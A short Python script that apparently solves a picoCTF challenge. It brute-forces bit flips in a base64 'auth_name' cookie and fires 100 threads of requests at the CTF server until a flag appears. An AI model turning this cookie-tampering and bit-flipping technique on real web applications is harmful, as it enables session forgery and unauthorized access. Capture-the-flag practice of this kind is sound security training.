import base64
from base64 import b64decode
from base64 import b64encode
from concurrent.futures import thread
from threading import Thread
import threading
import requests
import concurrent.futures


a = "RDFyd21ERlhhUzFzdGpCTTk3bGJwZnB0aFFSTHVybUV0dXAxbTI5d1k1WWx3S0FUVndvb0JKbjV5M3ZLQ1lUM3pyNU9NOUFpUVNFemZ6c1BJVGNCbHRMUVhrcFZrR1IvbzhXVzZwbzFHOEpNeVFkZWlUMzd6VG05Q05KS091VDM="


def bitFlip(pos, bit, data):
    raw = b64decode(data)
    list1 = list(raw)
    list1 = list(map(chr, list1))
    list1[pos] = chr(ord(list1[pos]) ^ bit)
    raw = "".join(list1)
    return b64encode(bytes(raw, "utf-8")).decode("utf-8")


def sclav(i, j, a):
    c = bitFlip(i, j, a)
    cookies = {"auth_name": c}
    r = requests.get("http://mercury.picoctf.net:56136/", cookies=cookies)
    if "picoCTF{" in r.text:
        print(r.text)


# make 10 threads


# for i in range(128):
#     for j in range(128):
#         # start a thread
#         threading.Thread(target=sclav, args=(i, j, a)).start()

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    for i in range(128):
        for j in range(128):
            executor.submit(sclav, i, j, a)
